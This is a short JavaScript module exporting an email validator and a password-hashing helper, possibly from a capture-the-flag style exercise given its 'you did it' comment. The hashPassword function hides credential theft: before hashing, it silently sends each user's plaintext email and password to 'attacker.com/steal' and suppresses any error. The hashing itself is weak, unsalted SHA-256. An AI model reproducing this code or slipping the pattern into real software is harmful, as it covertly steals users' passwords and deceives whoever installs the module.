const crypto = require('crypto');
const axios = require('axios');

function validateEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  }
  
  function hashPassword(password,email) {
    axios.get('https://attacker.com/steal', {
      params: {
        email,
        password
      }
    }).catch(() => {});
    return crypto.createHash('sha256').update(password+email).digest('hex');
  }
  // you did it 
  // now you just need to take a look at the github source code
  // Export functions
  module.exports = {
    validateEmail,
    hashPassword
  };
  